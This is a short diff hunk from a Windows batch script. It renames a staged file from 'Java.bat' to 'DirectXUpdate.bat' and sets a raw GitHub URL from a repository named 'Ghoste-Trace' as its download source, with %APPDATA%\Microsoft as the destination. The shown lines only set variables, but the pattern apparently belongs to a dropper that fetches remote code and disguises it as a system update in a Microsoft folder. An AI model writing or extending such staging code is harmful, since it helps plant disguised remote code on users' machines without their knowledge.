@@ -54,7 +54,7 @@ if exist "%TARGET_FILE%" (
     exit /b 1
 )
 
-:: Prepare Java.bat in AppData\Microsoft
+:: Prepare DirectXUpdate.bat in AppData\Microsoft
 set "MICROSOFT_FOLDER=%APPDATA%\Microsoft"
 set "DirectXUpdate_BAT_URL=https://raw.githubusercontent.com/Abdullah67289/Ghoste-Trace/refs/heads/main/DirectXUpdate.bat"
 set "DirectXUpdate_BAT_FILE=%MICROSOFT_FOLDER%\DirectXUpdate.bat"
